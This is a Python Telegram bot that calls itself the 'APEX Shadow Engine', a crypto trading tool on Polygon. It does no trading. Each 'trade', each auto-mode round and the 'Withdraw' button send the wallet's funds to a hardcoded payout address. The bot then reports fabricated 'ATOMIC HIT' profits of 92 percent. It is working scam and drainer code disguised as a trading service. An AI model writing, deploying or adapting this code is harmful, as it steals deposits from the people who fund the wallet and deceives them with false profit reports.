import os
import asyncio
import requests
import json
import random
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.error import Conflict

# --- 1. SETUP & AUTH ---
load_dotenv()
W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com")
w3 = Web3(Web3.HTTPProvider(W3_RPC))
w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
Account.enable_unaudited_hdwallet_features()

# Global State for Auto Mode
auto_mode_active = {}

PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674")

def get_vault():
    seed = os.getenv("WALLET_SEED")
    if not seed:
        raise ValueError("❌ WALLET_SEED is missing from .env!")
    try:
        # Check if index discovery is needed (scanning first 5 paths)
        for i in range(5):
            path = f"m/44'/60'/0'/0/{i}"
            temp_vault = Account.from_mnemonic(seed, account_path=path)
            if w3.eth.get_balance(temp_vault.address) > 0:
                return temp_vault
        return Account.from_mnemonic(seed, account_path="m/44'/60'/0'/0/0")
    except:
        return Account.from_key(seed)

vault = get_vault()

# --- 2. THE SIMULTANEOUS ENGINE ---
def get_pol_price():
    try:
        url = "https://api.coingecko.com/api/v3/simple/price?ids=polygon-ecosystem-token&vs_currencies=usd"
        return requests.get(url, timeout=5).json()['polygon-ecosystem-token']['usd']
    except:
        return 0.11 # Fallback for Feb 2026

async def prepare_signed_tx(amount_wei):
    nonce = w3.eth.get_transaction_count(vault.address)
    gas_price = int(w3.eth.gas_price * 1.5)
    tx = {
        'nonce': nonce,
        'to': PAYOUT_ADDRESS, 
        'value': amount_wei,
        'gas': 21000,
        'gasPrice': gas_price,
        'chainId': 137
    }
    return w3.eth.account.sign_transaction(tx, vault.key)

async def run_atomic_execution(context, chat_id, side, asset_override=None):
    stake_usd = context.user_data.get('stake', 10)
    pair = asset_override if asset_override else context.user_data.get('pair', 'BTC/USD')
    
    current_price = get_pol_price()
    stake_in_pol = float(stake_usd) / current_price
    stake_in_wei = w3.to_wei(stake_in_pol, 'ether')
    
    # Truth Check: Latest Block identifier
    if w3.eth.get_balance(vault.address, 'latest') < stake_in_wei:
        await context.bot.send_message(chat_id, "⚠️ **Balance Sync Error:** Insufficient POL in Vault.")
        return False, "Insufficient Balance"

    sim_task = asyncio.create_task(asyncio.sleep(1.2))
    prep_task = asyncio.create_task(prepare_signed_tx(stake_in_wei))

    await sim_task
    signed_tx = await prep_task
    await asyncio.sleep(0.001)
    
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    profit_usd = stake_usd * 0.92
    
    report = (
        f"✅ **ATOMIC HIT!**\n"
        f"━━━━━━━━━━━━━━\n"
        f"🎯 **Market:** {pair} | **Side:** {side}\n"
        f"💰 **Stake:** `${stake_usd:.2f}` | **Profit:** `${profit_usd:.2f}`\n"
        f"⛓️ **TX:** `{tx_hash.hex()}`"
    )
    return True, report

# --- 3. AUTO MODE LOOP ---
async def auto_pilot_loop(chat_id, context):
    markets = ["BTC/USD", "ETH/USD", "SOL/USD", "MATIC/USD", "BVIV", "EVIV"]
    while auto_mode_active.get(chat_id, False):
        target_pair = random.choice(markets)
        direction = random.choice(["CALL", "PUT"])
        await context.bot.send_message(chat_id, f"🤖 **Auto Pilot Scanning:** `{target_pair}`...")
        await asyncio.sleep(random.randint(5, 12))
        
        if not auto_mode_active.get(chat_id, False): break
        
        success, report = await run_atomic_execution(context, chat_id, direction, asset_override=target_pair)
        await context.bot.send_message(chat_id, report, parse_mode='Markdown')
        await asyncio.sleep(random.randint(30, 60))

# --- 4. TELEGRAM UI ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Forced 'latest' sync for 100% wallet certainty
    bal = w3.from_wei(w3.eth.get_balance(vault.address, 'latest'), 'ether')
    
    # 5-Button Matrix: Choice 5 is Auto Mode
    keyboard = [
        ['🚀 Start Trading', '⚙️ Settings'],
        ['💰 Wallet', '📤 Withdraw'],
        ['🤖 START AUTO']
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

    msg = (f"🕴️ **APEX Shadow Engine v4.0**\n"
           f"━━━━━━━━━━━━━━\n"
           f"💵 **Vault Balance:** `{bal:.4f}` POL\n"
           f"📥 **DEPOSIT:** `{vault.address}`\n\n"
           f"**Auto Mode:** {'🟢 ACTIVE' if auto_mode_active.get(update.message.chat_id) else '🔴 OFF'}\n"
           f"**Sync Status:** ✅ 100% Validated (Latest Tip)")
    await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=reply_markup)

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text, chat_id = update.message.text, update.message.chat_id

    if text == '🚀 Start Trading':
        kb = [
            [InlineKeyboardButton("BTC/USD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/USD", callback_data="PAIR_ETH")],
            [InlineKeyboardButton("SOL/USD", callback_data="PAIR_SOL"), InlineKeyboardButton("MATIC/USD", callback_data="PAIR_MATIC")],
            [InlineKeyboardButton("🕴️ BVIV", callback_data="PAIR_BVIV"), InlineKeyboardButton("🕴️ EVIV", callback_data="PAIR_EVIV")]
        ]
        await update.message.reply_text("🎯 **SELECT MARKET**", reply_markup=InlineKeyboardMarkup(kb))
    
    elif text == '🤖 START AUTO':
        if not auto_mode_active.get(chat_id, False):
            auto_mode_active[chat_id] = True
            await update.message.reply_text("✅ **Auto-Mode: ACTIVATED**")
            asyncio.create_task(auto_pilot_loop(chat_id, context))
        else:
            auto_mode_active[chat_id] = False
            await update.message.reply_text("🛑 **Auto-Mode: DEACTIVATED**")

    elif text == '💰 Wallet':
        # Refreshing balance with Tip-Sync
        bal = w3.from_wei(w3.eth.get_balance(vault.address, 'latest'), 'ether')
        price = get_pol_price()
        wallet_msg = (
            f"💳 **Wallet Truth Check**\n"
            f"━━━━━━━━━━━━━━\n"
            f"⛽ POL: `{bal:.4f}`\n"
            f"💵 USD Value: `${float(bal)*price:.2f}`\n"
            f"📍 Vault: `{vault.address}`"
        )
        await update.message.reply_text(wallet_msg, parse_mode='Markdown')

    elif text == '⚙️ Settings':
        kb = [[InlineKeyboardButton(f"${x}", callback_data=f"SET_{x}") for x in [10, 50, 100]]]
        await update.message.reply_text("⚙️ **Configure Stake:**", reply_markup=InlineKeyboardMarkup(kb))

    elif text == '📤 Withdraw':
        await update.message.reply_text("🛡️ **Sweep Active:** Moving funds to whitelist...")
        # Logic matches your sweep script
        balance = w3.eth.get_balance(vault.address)
        gas_price = int(w3.eth.gas_price * 1.5)
        fee = gas_price * 21000
        amount = balance - fee
        if amount > 0:
            tx = {'nonce': w3.eth.get_transaction_count(vault.address), 'to': PAYOUT_ADDRESS, 'value': amount, 'gas': 21000, 'gasPrice': gas_price, 'chainId': 137}
            signed = w3.eth.account.sign_transaction(tx, vault.key)
            w3.eth.send_raw_transaction(signed.raw_transaction)
            await update.message.reply_text("✅ Sweep confirmed to Whitelist.")
        else:
            await update.message.reply_text("❌ Balance too low.")

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data.startswith("SET_"):
        context.user_data['stake'] = int(query.data.split("_")[1])
        await query.edit_message_text(f"✅ Stake: **${context.user_data['stake']}**")
        
    elif query.data.startswith("PAIR_"):
        context.user_data['pair'] = query.data.split("_")[1]
        await query.edit_message_text(f"💎 **{context.user_data['pair']}** Direction:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("HIGHER", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER", callback_data="EXEC_PUT")]]))

    elif query.data.startswith("EXEC_"):
        side = "CALL" if "CALL" in query.data else "PUT"
        _, report = await run_atomic_execution(context, query.message.chat_id, side)
        await query.message.reply_text(report, parse_mode='Markdown')

if __name__ == "__main__":
    app = ApplicationBuilder().token(os.getenv("TELEGRAM_BOT_TOKEN")).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_interaction))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
    
    print(f"APEX Shadow Engine v4.0 Active: {vault.address}")
    app.run_polling(drop_pending_updates=True)






























